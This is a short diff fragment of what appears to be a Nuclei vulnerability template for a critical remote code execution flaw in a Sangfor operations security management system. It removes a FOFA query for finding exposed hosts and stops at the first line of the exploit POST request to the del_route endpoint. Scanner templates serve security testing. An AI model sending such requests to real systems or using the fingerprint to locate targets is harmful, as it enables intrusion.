@@ -3,12 +3,8 @@ info:
   name: 深信服运维安全管理系统 del_route 远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yxw8gmxeewxuqv4f'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yxw8gmxeewxuqv4f
-    fofa: body="/fort/login" && header="FORTSESSIONID"
 http:
 - raw:
   - 'POST /fort/system;help/netConfig/del_route HTTP/1.1
